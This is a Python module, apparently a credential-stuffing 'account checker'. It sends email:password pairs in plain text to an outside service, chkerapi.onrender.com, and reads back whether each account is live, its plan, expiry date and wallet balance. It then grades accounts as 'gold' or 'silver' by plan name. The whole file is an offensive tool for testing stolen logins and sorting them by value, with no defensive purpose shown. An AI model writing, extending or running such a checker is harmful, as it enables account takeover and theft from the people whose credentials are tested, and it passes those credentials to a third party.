import requests

BASE = "https://chkerapi.onrender.com"


class CheckerError(Exception):
    pass


def check(email: str, password: str, timeout: int = 45) -> dict:
    url = f"{BASE}/check/{email}:{password}"
    try:
        r = requests.get(url, timeout=timeout)
    except requests.RequestException as e:
        raise CheckerError(f"network: {type(e).__name__}") from e

    try:
        payload = r.json()
    except ValueError:
        raise CheckerError(f"non-json ({r.status_code}): {r.text[:120]}")

    out = {
        "ok": False, "live": False, "plan_name": None,
        "plan_category": "silver",
        "wallet": {"balance": 0.0, "currency": "USD"},
        "expiry": None, "raw": payload, "error": None,
    }

    if not payload.get("success"):
        out["error"] = payload.get("error") or payload.get("reason") or "check_failed"
        return out

    account = payload.get("account") or {}
    wallet = payload.get("wallet") or {}
    plan = payload.get("plan") or {}

    out["ok"] = True
    out["plan_name"] = plan.get("name") or account.get("planName")
    out["expiry"] = account.get("endDate") or plan.get("endDate")

    try:
        out["wallet"]["balance"] = float(wallet.get("balance") or 0)
    except (TypeError, ValueError):
        pass
    out["wallet"]["currency"] = wallet.get("currency") or "USD"

    if out["plan_name"]:
        low = out["plan_name"].lower()
        if any(k in low for k in ("gold", "golden", "royal", "premium",
                                   "diamond", "platinum")):
            out["plan_category"] = "gold"
        else:
            out["plan_category"] = "silver"

    status = (account.get("status") or "").upper()
    if status in ("LIVE", "ACTIVE"):
        out["live"] = True
    elif status in ("EXPIRED", "DEAD", "INVALID"):
        out["live"] = False
    else:
        out["live"] = True
    return out